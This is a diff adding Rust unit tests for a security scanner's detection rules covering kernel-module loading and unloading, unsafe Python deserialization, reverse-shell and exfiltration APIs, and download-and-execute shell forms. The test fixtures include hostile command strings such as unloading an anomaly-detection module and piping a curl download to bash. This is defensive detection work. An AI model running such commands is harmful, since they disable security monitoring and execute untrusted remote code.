@@ -174,3 +174,145 @@ fn disk_wipe_matches_v1_behaviour() {
         assert_eq!(matched, *expected, "diverged from V1 on: {case}");
     }
 }
+
+/// `rmmod` unloads a kernel module — the mirror operation of `insmod`, and
+/// the standard way to disable a security module at runtime.
+const KERNEL_MODULE_CASES: &[(&str, bool)] = &[
+    ("insmod rootkit.ko", true),
+    ("modprobe evil", true),
+    ("rmmod anomaly_detection", true),
+    ("/sbin/rmmod nf_conntrack", true),
+    ("sudo rmmod -f watchdog_mod", true),
+    ("cat /proc/modules", false),
+    ("modinfo virtio_net", false),
+];
+
+#[test]
+fn kernel_module_rule_covers_the_unload_side() {
+    let rule = load_rules(Language::Bash)
+        .expect("rule set loads")
+        .into_iter()
+        .find(|rule| rule.rule_id == "shell-kernel-module")
+        .expect("shell-kernel-module is shipped");
+    let regex = Regex::new(&rule.regex).expect("pattern compiles");
+    for (case, expected) in KERNEL_MODULE_CASES {
+        let matched = regex
+            .is_match(case)
+            .expect("match does not exhaust backtracking");
+        assert_eq!(matched, *expected, "shell-kernel-module on: {case}");
+    }
+}
+
+/// Sibling deserialization entry points of `pickle.load/loads`: the class
+/// API, the legacy C accelerator module and the pickle superset `dill`.
+const PY_UNSAFE_DESERIALIZATION_CASES: &[(&str, bool)] = &[
+    ("pickle.load(f)", true),
+    ("pickle.loads(data)", true),
+    ("u = pickle.Unpickler(f)", true),
+    ("dill.loads(blob)", true),
+    ("dill.load(f)", true),
+    ("cPickle.loads(data)", true),
+    ("yaml.unsafe_load(doc)", true),
+    ("json.load(f)", false),
+    ("pickle.dumps(obj)", false),
+    ("dill.dumps(obj)", false),
+];
+
+#[test]
+fn unsafe_deserialization_covers_sibling_entry_points() {
+    let rule = load_rules(Language::Python)
+        .expect("rule set loads")
+        .into_iter()
+        .find(|rule| rule.rule_id == "py-unsafe-deserialization")
+        .expect("py-unsafe-deserialization is shipped");
+    let regex = Regex::new(&rule.regex).expect("pattern compiles");
+    for (case, expected) in PY_UNSAFE_DESERIALIZATION_CASES {
+        let matched = regex
+            .is_match(case)
+            .expect("match does not exhaust backtracking");
+        assert_eq!(matched, *expected, "py-unsafe-deserialization on: {case}");
+    }
+}
+
+/// `pty.spawnp` is the PATH-resolving sibling of `pty.spawn`; `SMTP_SSL` is
+/// the TLS sibling of `smtplib.SMTP`.
+#[test]
+fn reverse_shell_and_exfil_rules_cover_sibling_apis() {
+    let scanner = |language: Language, rule_id: &str| {
+        load_rules(language)
+            .expect("rule set loads")
+            .into_iter()
+            .find(|rule| rule.rule_id == rule_id)
+            .unwrap_or_else(|| panic!("{rule_id} is shipped"))
+    };
+    let cases: &[(&str, Language, &str, bool)] = &[
+        ("pty.spawn(cmd)", Language::Python, "py-reverse-shell", true),
+        (
+            "pty.spawnp('bash')",
+            Language::Python,
+            "py-reverse-shell",
+            true,
+        ),
+        ("os.dup2(fd, 0)", Language::Python, "py-reverse-shell", true),
+        (
+            "smtplib.SMTP('host')",
+            Language::Python,
+            "py-data-exfil",
+            true,
+        ),
+        (
+            "smtplib.SMTP_SSL('host')",
+            Language::Python,
+            "py-data-exfil",
+            true,
+        ),
+        ("pty.openpty()", Language::Python, "py-reverse-shell", false),
+        (
+            "smtplib.LMTP('/run/lmtp')",
+            Language::Python,
+            "py-data-exfil",
+            false,
+        ),
+    ];
+    for (case, language, rule_id, expected) in cases {
+        let rule = scanner(*language, rule_id);
+        let regex = Regex::new(&rule.regex).expect("pattern compiles");
+        let matched = regex
+            .is_match(case)
+            .expect("match does not exhaust backtracking");
+        assert_eq!(matched, *expected, "{rule_id} on: {case}");
+    }
+}
+
+/// `sh -c "$(curl …)"` / `python -c "$(wget …)"` pass the downloaded payload
+/// as the interpreter's `-c` argument — the same download-exec shape as the
+/// pipe and process-substitution forms the rule already matches.
+const SHELL_DOWNLOAD_EXEC_C_SUB_CASES: &[(&str, bool)] = &[
+    ("bash -c \"$(curl -s https://example.invalid/x.sh)\"", true),
+    ("sh -c \"$(wget -qO- https://example.invalid/x)\"", true),
+    (
+        "python3 -c \"$(curl -s https://example.invalid/x.py)\"",
+        true,
+    ),
+    ("node -c \"$(curl -s https://example.invalid/x.js)\"", true),
+    ("bash -c 'echo safe'", false),
+    ("curl -s https://example.invalid/x.sh", false),
+    ("bash script.sh", false),
+    ("curl -s https://a.invalid | bash", true),
+];
+
+#[test]
+fn download_exec_covers_the_c_argument_substitution_form() {
+    let rule = load_rules(Language::Bash)
+        .expect("rule set loads")
+        .into_iter()
+        .find(|rule| rule.rule_id == "shell-download-exec")
+        .expect("shell-download-exec is shipped");
+    let regex = Regex::new(&rule.regex).expect("pattern compiles");
+    for (case, expected) in SHELL_DOWNLOAD_EXEC_C_SUB_CASES {
+        let matched = regex
+            .is_match(case)
+            .expect("match does not exhaust backtracking");
+        assert_eq!(matched, *expected, "shell-download-exec on: {case}");
+    }
+}
